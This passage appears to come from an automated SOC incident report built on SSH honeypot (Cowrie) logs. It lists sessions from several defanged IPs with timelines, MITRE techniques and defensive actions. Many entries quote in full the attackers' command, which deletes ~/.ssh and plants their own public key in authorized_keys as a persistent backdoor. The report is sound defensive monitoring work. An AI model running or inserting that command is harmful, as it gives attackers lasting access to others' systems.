| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:38:31` | `cowrie.session.connect` |
| `2026-04-12 10:38:31` | `cowrie.client.version` |
| `2026-04-12 10:38:31` | `cowrie.client.kex` |
| `2026-04-12 10:38:32` | `cowrie.login.success` |
| `2026-04-12 10:38:32` | `cowrie.session.params` |
| `2026-04-12 10:38:32` | `cowrie.command.input` |
| `2026-04-12 10:38:32` | `cowrie.command.failed` |
| `2026-04-12 10:38:32` | `cowrie.log.closed` |
| `2026-04-12 10:38:32` | `cowrie.session.params` |
| `2026-04-12 10:38:32` | `cowrie.command.input` |
| `2026-04-12 10:38:33` | `cowrie.session.file_download` |
| `2026-04-12 10:38:33` | `cowrie.log.closed` |
| `2026-04-12 10:38:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.209.4[.]195` to AbuseIPDB if not already reported
- [ ] Block `154.209.4[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b51656a65763

| Field | Detail |
|---|---|
| **Source IP** | `69.6.221[.]248` |
| **First Seen** | 2026-04-12 10:38 |
| **Last Seen** | 2026-04-12 10:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:38:33` | `cowrie.session.connect` |
| `2026-04-12 10:38:33` | `cowrie.client.version` |
| `2026-04-12 10:38:33` | `cowrie.client.kex` |
| `2026-04-12 10:38:34` | `cowrie.login.success` |
| `2026-04-12 10:38:35` | `cowrie.session.params` |
| `2026-04-12 10:38:35` | `cowrie.command.input` |
| `2026-04-12 10:38:35` | `cowrie.command.failed` |
| `2026-04-12 10:38:35` | `cowrie.log.closed` |
| `2026-04-12 10:38:36` | `cowrie.session.params` |
| `2026-04-12 10:38:36` | `cowrie.command.input` |
| `2026-04-12 10:38:37` | `cowrie.session.file_download` |
| `2026-04-12 10:38:37` | `cowrie.log.closed` |
| `2026-04-12 10:38:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.221[.]248` to AbuseIPDB if not already reported
- [ ] Block `69.6.221[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfcf5a83c03a

| Field | Detail |
|---|---|
| **Source IP** | `154.209.4[.]195` |
| **First Seen** | 2026-04-12 10:38 |
| **Last Seen** | 2026-04-12 10:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:38:35` | `cowrie.session.connect` |
| `2026-04-12 10:38:35` | `cowrie.client.version` |
| `2026-04-12 10:38:35` | `cowrie.client.kex` |
| `2026-04-12 10:38:35` | `cowrie.login.success` |
| `2026-04-12 10:38:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.209.4[.]195` to AbuseIPDB if not already reported
- [ ] Block `154.209.4[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3de66c72934

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-12 10:38 |
| **Last Seen** | 2026-04-12 10:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:38:38` | `cowrie.session.connect` |
| `2026-04-12 10:38:38` | `cowrie.client.version` |
| `2026-04-12 10:38:38` | `cowrie.client.kex` |
| `2026-04-12 10:38:39` | `cowrie.login.success` |
| `2026-04-12 10:38:40` | `cowrie.session.params` |
| `2026-04-12 10:38:40` | `cowrie.command.input` |
| `2026-04-12 10:38:40` | `cowrie.command.failed` |
| `2026-04-12 10:38:40` | `cowrie.log.closed` |
| `2026-04-12 10:38:41` | `cowrie.session.params` |
| `2026-04-12 10:38:41` | `cowrie.command.input` |
| `2026-04-12 10:38:42` | `cowrie.session.file_download` |
| `2026-04-12 10:38:42` | `cowrie.log.closed` |
| `2026-04-12 10:38:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1da382760bb

| Field | Detail |
|---|---|
| **Source IP** | `69.6.221[.]248` |
| **First Seen** | 2026-04-12 10:38 |
| **Last Seen** | 2026-04-12 10:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:38:40` | `cowrie.session.connect` |
| `2026-04-12 10:38:40` | `cowrie.client.version` |
| `2026-04-12 10:38:41` | `cowrie.client.kex` |
| `2026-04-12 10:38:42` | `cowrie.login.success` |
| `2026-04-12 10:38:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.221[.]248` to AbuseIPDB if not already reported
- [ ] Block `69.6.221[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4f0f092b76c

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-12 10:38 |
| **Last Seen** | 2026-04-12 10:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:38:45` | `cowrie.session.connect` |
| `2026-04-12 10:38:45` | `cowrie.client.version` |
| `2026-04-12 10:38:46` | `cowrie.client.kex` |
| `2026-04-12 10:38:47` | `cowrie.login.success` |
| `2026-04-12 10:38:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-346d75b7c0b6

| Field | Detail |
|---|---|
| **Source IP** | `101.47.159[.]125` |
| **First Seen** | 2026-04-12 10:40 |
| **Last Seen** | 2026-04-12 10:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:40:00` | `cowrie.session.connect` |
| `2026-04-12 10:40:00` | `cowrie.client.version` |
| `2026-04-12 10:40:00` | `cowrie.client.kex` |
| `2026-04-12 10:40:00` | `cowrie.login.success` |
| `2026-04-12 10:40:00` | `cowrie.session.params` |
| `2026-04-12 10:40:00` | `cowrie.command.input` |
| `2026-04-12 10:40:00` | `cowrie.command.failed` |
| `2026-04-12 10:40:01` | `cowrie.log.closed` |
| `2026-04-12 10:40:01` | `cowrie.session.params` |
| `2026-04-12 10:40:01` | `cowrie.command.input` |
| `2026-04-12 10:40:01` | `cowrie.session.file_download` |
| `2026-04-12 10:40:01` | `cowrie.log.closed` |
| `2026-04-12 10:40:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.159[.]125` to AbuseIPDB if not already reported
- [ ] Block `101.47.159[.]125` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cf90a2d3828

| Field | Detail |
|---|---|
| **Source IP** | `101.47.159[.]125` |
| **First Seen** | 2026-04-12 10:40 |
| **Last Seen** | 2026-04-12 10:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:40:03` | `cowrie.session.connect` |
| `2026-04-12 10:40:03` | `cowrie.client.version` |
| `2026-04-12 10:40:03` | `cowrie.client.kex` |
| `2026-04-12 10:40:03` | `cowrie.login.success` |
| `2026-04-12 10:40:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.159[.]125` to AbuseIPDB if not already reported
- [ ] Block `101.47.159[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db98859dc039

| Field | Detail |
|---|---|
| **Source IP** | `69.6.221[.]248` |
| **First Seen** | 2026-04-12 10:40 |
| **Last Seen** | 2026-04-12 10:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:40:21` | `cowrie.session.connect` |
| `2026-04-12 10:40:21` | `cowrie.client.version` |
| `2026-04-12 10:40:22` | `cowrie.client.kex` |
| `2026-04-12 10:40:23` | `cowrie.login.success` |
| `2026-04-12 10:40:24` | `cowrie.session.params` |
| `2026-04-12 10:40:24` | `cowrie.command.input` |
| `2026-04-12 10:40:24` | `cowrie.command.failed` |
| `2026-04-12 10:40:24` | `cowrie.log.closed` |
| `2026-04-12 10:40:25` | `cowrie.session.params` |
| `2026-04-12 10:40:25` | `cowrie.command.input` |
| `2026-04-12 10:40:25` | `cowrie.session.file_download` |
| `2026-04-12 10:40:25` | `cowrie.log.closed` |
| `2026-04-12 10:40:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.221[.]248` to AbuseIPDB if not already reported
- [ ] Block `69.6.221[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c351adbf789

| Field | Detail |
|---|---|
| **Source IP** | `69.6.221[.]248` |
| **First Seen** | 2026-04-12 10:40 |
| **Last Seen** | 2026-04-12 10:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:40:29` | `cowrie.session.connect` |
| `2026-04-12 10:40:29` | `cowrie.client.version` |
| `2026-04-12 10:40:29` | `cowrie.client.kex` |
| `2026-04-12 10:40:31` | `cowrie.login.success` |
| `2026-04-12 10:40:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.221[.]248` to AbuseIPDB if not already reported
- [ ] Block `69.6.221[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82330436ea97

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-12 10:40 |
| **Last Seen** | 2026-04-12 10:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:40:42` | `cowrie.session.connect` |
| `2026-04-12 10:40:42` | `cowrie.client.version` |
| `2026-04-12 10:40:42` | `cowrie.client.kex` |
| `2026-04-12 10:40:43` | `cowrie.login.success` |
| `2026-04-12 10:40:44` | `cowrie.session.params` |
| `2026-04-12 10:40:44` | `cowrie.command.input` |
| `2026-04-12 10:40:44` | `cowrie.command.failed` |
| `2026-04-12 10:40:44` | `cowrie.log.closed` |
| `2026-04-12 10:40:45` | `cowrie.session.params` |
| `2026-04-12 10:40:45` | `cowrie.command.input` |
| `2026-04-12 10:40:45` | `cowrie.session.file_download` |
| `2026-04-12 10:40:45` | `cowrie.log.closed` |
| `2026-04-12 10:40:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-684af4b6e526

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-12 10:40 |
| **Last Seen** | 2026-04-12 10:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:40:48` | `cowrie.session.connect` |
| `2026-04-12 10:40:48` | `cowrie.client.version` |
| `2026-04-12 10:40:49` | `cowrie.client.kex` |
| `2026-04-12 10:40:50` | `cowrie.login.success` |
| `2026-04-12 10:40:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18c8f115eb67

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-12 10:42 |
| **Last Seen** | 2026-04-12 10:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:42:54` | `cowrie.session.connect` |
| `2026-04-12 10:42:54` | `cowrie.client.version` |
| `2026-04-12 10:42:54` | `cowrie.client.kex` |
| `2026-04-12 10:42:55` | `cowrie.login.success` |
| `2026-04-12 10:42:56` | `cowrie.session.params` |
| `2026-04-12 10:42:56` | `cowrie.command.input` |
| `2026-04-12 10:42:56` | `cowrie.command.failed` |
| `2026-04-12 10:42:56` | `cowrie.log.closed` |
| `2026-04-12 10:42:57` | `cowrie.session.params` |
| `2026-04-12 10:42:57` | `cowrie.command.input` |
| `2026-04-12 10:42:57` | `cowrie.session.file_download` |
| `2026-04-12 10:42:57` | `cowrie.log.closed` |
| `2026-04-12 10:43:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf32f3154c02

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-12 10:43 |
| **Last Seen** | 2026-04-12 10:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:43:00` | `cowrie.session.connect` |
| `2026-04-12 10:43:00` | `cowrie.client.version` |
| `2026-04-12 10:43:00` | `cowrie.client.kex` |
| `2026-04-12 10:43:01` | `cowrie.login.success` |
| `2026-04-12 10:43:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ea3ff0955dc

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-12 10:43 |
| **Last Seen** | 2026-04-12 10:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:43:39` | `cowrie.session.connect` |
| `2026-04-12 10:43:39` | `cowrie.client.version` |
| `2026-04-12 10:43:40` | `cowrie.client.kex` |
| `2026-04-12 10:43:41` | `cowrie.login.success` |
| `2026-04-12 10:43:41` | `cowrie.session.params` |
| `2026-04-12 10:43:41` | `cowrie.command.input` |
| `2026-04-12 10:43:41` | `cowrie.command.failed` |
| `2026-04-12 10:43:41` | `cowrie.log.closed` |
| `2026-04-12 10:43:42` | `cowrie.session.params` |
| `2026-04-12 10:43:42` | `cowrie.command.input` |
| `2026-04-12 10:43:42` | `cowrie.session.file_download` |
| `2026-04-12 10:43:42` | `cowrie.log.closed` |
| `2026-04-12 10:43:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-577dfed477f6

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-12 10:43 |
| **Last Seen** | 2026-04-12 10:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:43:45` | `cowrie.session.connect` |
| `2026-04-12 10:43:45` | `cowrie.client.version` |
| `2026-04-12 10:43:46` | `cowrie.client.kex` |
| `2026-04-12 10:43:47` | `cowrie.login.success` |
| `2026-04-12 10:43:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-542379b3e20a

| Field | Detail |
|---|---|
| **Source IP** | `154.209.4[.]195` |
| **First Seen** | 2026-04-12 10:43 |
| **Last Seen** | 2026-04-12 10:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:43:59` | `cowrie.session.connect` |
| `2026-04-12 10:43:59` | `cowrie.client.version` |
| `2026-04-12 10:43:59` | `cowrie.client.kex` |
| `2026-04-12 10:43:59` | `cowrie.login.success` |
| `2026-04-12 10:43:59` | `cowrie.session.params` |
| `2026-04-12 10:43:59` | `cowrie.command.input` |
